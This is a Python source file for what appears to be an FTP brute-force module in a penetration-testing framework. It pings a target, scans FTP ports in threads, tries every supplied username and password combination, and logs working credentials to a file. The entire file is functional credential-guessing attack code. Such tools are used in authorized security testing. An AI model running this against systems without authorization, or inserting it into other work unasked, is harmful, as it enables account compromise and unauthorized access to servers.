#!/usr/bin/env python
# -*- coding: utf-8 -*-

import threading
import time
import json
import string
import random
import os
from core.alert import *
from ftplib import FTP
from core.targets import target_type
from core.targets import target_to_host
from lib.icmp.engine import do_one as do_one_ping


def login(user, passwd, target, port, timeout_sec, log_in_file, language, retries, time_sleep, thread_tmp_filename):
    _HOST = messages(language, 53)
    _USERNAME = messages(language, 54)
    _PASSWORD = messages(language, 55)
    _PORT = messages(language, 56)
    _TYPE = messages(language, 57)
    _DESCRIPTION = messages(language, 58)
    exit = 0
    while 1:
        try:
            if timeout_sec is not None:
                my_ftp = FTP(timeout=timeout_sec)
            else:
                my_ftp = FTP()
            my_ftp.connect(target, port)
            exit = 0
            break
        except:
            exit += 1
            if exit is retries:
                warn(messages(language, 65).format(target, port, user, passwd))
                return 1
        time.sleep(time_sleep)
    flag = 1
    try:
        my_ftp.login(user, passwd)
        flag = 0
    except:
        pass
    if flag is 0:
        try:
            tmpl = []
            tmp = my_ftp.retrlines('LIST', tmpl.append)
            info(messages(language, 70).format(user, passwd, target, port))
            save = open(log_in_file, 'a')
            save.write(
                json.dumps({_HOST: target, _USERNAME: user, _PASSWORD: passwd, _PORT: port, _TYPE: 'ftp_brute',
                            _DESCRIPTION: messages(language, 66)}) + '\n')
            save.close()
        except:
            info(messages(language, 70).format(user, passwd, target, port) + ' ' + messages(language, 71))
            save = open(log_in_file, 'a')
            save.write(json.dumps({_HOST: target, _USERNAME: user, _PASSWORD: passwd, _PORT: port, _TYPE: 'FTP',
                                   _DESCRIPTION: messages(language, 67)}) + '\n')
            save.close()
        thread_write = open(thread_tmp_filename, 'w')
        thread_write.write('0')
        thread_write.close()
    else:
        pass
    return flag


def __connect_to_port(port, timeout_sec, target, retries, language, num, total, time_sleep, ports_tmp_filename):
    exit = 0
    while 1:
        try:
            if timeout_sec is not None:
                my_ftp = FTP(timeout=timeout_sec)
            else:
                my_ftp = FTP()
            my_ftp.connect(target, int(port))
            exit = 0
            break
        except:
            exit += 1
            if exit is retries:
                error(messages(language, 68).format(target, port, str(num), str(total)))
                try:
                    f = open(ports_tmp_filename, 'a')
                    f.write(str(port) + '\n')
                    f.close()
                except:
                    pass
                break
        time.sleep(time_sleep)


def test_ports(ports, timeout_sec, target, retries, language, num, total, time_sleep, ports_tmp_filename,
               thread_number, total_req):
    _ports = ports[:]
    threads = []
    trying = 0
    for port in _ports:
        # test ftp
        t = threading.Thread(target=__connect_to_port,
                             args=(
                                 port, timeout_sec, target, retries, language, num, total, time_sleep,
                                 ports_tmp_filename))
        threads.append(t)
        t.start()
        trying += 1
        info(messages(language, 72).format(trying, total_req, num, total, target, port))
        while 1:
            n = 0
            for thread in threads:
                if thread.isAlive() is True:
                    n += 1
                else:
                    threads.remove(thread)
            if n >= thread_number:
                time.sleep(0.1)
            else:
                break
    while 1:
        n = True
        for thread in threads:
            if thread.isAlive() is True:
                n = False
        time.sleep(0.1)
        if n is True:
            break
    _ports = list(set(open(ports_tmp_filename).read().rsplit()))
    for port in _ports:
        try:
            ports.remove(int(port))
        except:
            try:
                ports.remove(port)
            except:
                pass
    os.remove(ports_tmp_filename)
    return ports


def start(target, users, passwds, ports, timeout_sec, thread_number, num, total, log_in_file, time_sleep,
          language, verbose_level, show_version, check_update, proxies, retries, ping_flag):  # Main function
    if target_type(target) != 'SINGLE_IPv4' or target_type(target) != 'DOMAIN' or target_type(target) != 'HTTP':
        if target_type(target) == 'HTTP':
            target = target_to_host(target)
        if do_one_ping(target, timeout_sec, 8) is None:
            warn(messages(language, 100).format(target, 'ftp_brute'))
            return None
        threads = []
        max = thread_number
        total_req = len(users) * len(passwds) * len(ports)
        thread_tmp_filename = 'tmp/thread_tmp_' + ''.join(
            random.choice(string.ascii_letters + string.digits) for _ in range(20))
        ports_tmp_filename = 'tmp/ports_tmp_' + ''.join(
            random.choice(string.ascii_letters + string.digits) for _ in range(20))
        thread_write = open(thread_tmp_filename, 'w')
        thread_write.write('1')
        thread_write.close()
        ports_write = open(ports_tmp_filename, 'w')
        ports_write.write('')
        ports_write.close()
        trying = 0
        ports = test_ports(ports, timeout_sec, target, retries, language, num, total, time_sleep, ports_tmp_filename,
                           thread_number, total_req)

        for port in ports:
            for user in users:
                for passwd in passwds:
                    t = threading.Thread(target=login,
                                         args=(
                                             user, passwd, target, port, timeout_sec, log_in_file, language,
                                             retries, time_sleep, thread_tmp_filename))
                    threads.append(t)
                    t.start()
                    trying += 1
                    info(messages(language, 72).format(trying, total_req, num, total, target, port))
                    while 1:
                        n = 0
                        for thread in threads:
                            if thread.isAlive() is True:
                                n += 1
                            else:
                                threads.remove(thread)
                        if n >= max:
                            time.sleep(0.1)
                        else:
                            break

        # wait for threads
        while 1:
            n = True
            for thread in threads:
                if thread.isAlive() is True:
                    n = False
            time.sleep(0.1)
            if n is True:
                break
        thread_write = int(open(thread_tmp_filename).read().rsplit()[0])
        if thread_write is 1 and verbose_level is not 0:
            _HOST = messages(language, 53)
            _USERNAME = messages(language, 54)
            _PASSWORD = messages(language, 55)
            _PORT = messages(language, 56)
            _TYPE = messages(language, 57)
            _DESCRIPTION = messages(language, 58)
            save = open(log_in_file, 'a')
            save.write(json.dumps({_HOST: target, _USERNAME: '', _PASSWORD: '', _PORT: '', _TYPE: 'ftp_brute',
                                   _DESCRIPTION: messages(language, 95)}) + '\n')
            save.close()
        os.remove(thread_tmp_filename)
    else:
        warn(messages(language, 69).format('ftp_brute', target))
